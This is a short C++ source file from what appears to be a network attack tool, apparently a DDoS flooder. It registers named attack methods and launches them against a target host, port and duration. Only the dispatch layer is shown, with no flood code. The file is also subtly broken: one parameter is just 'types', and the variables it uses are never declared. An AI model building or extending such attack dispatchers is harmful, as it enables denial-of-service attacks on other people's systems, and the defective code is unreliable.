#include <future>
#include <map>
#include <string>

#include "headers/attack.hpp"
#include "headers/main.hpp"
#include "headers/methods.hpp"
#include "headers/utils.hpp"

/*
name = command name
func = function
*/
void AttackReg::AddMethod(const string& name, FunctionType func) {
  functions[name] = func;
#ifdef DEBUG
  printf("[DEBUG] Method %s is loaded\n", name.c_str());
#endif
}

void AttackReg::LaunchMethod(const string& name, types) {
  if (functions.find(name) != functions.end()) {
#ifdef DEBUG
    printf("[%s] Attack started\n", name.substr(1).c_str());
#endif
    Launch(target, port, duration, stop, functions[name]);
  } else {
#ifdef DEBUG
    printf("[%s] Command not found\n", name.c_str());
    return;
#endif
  }
}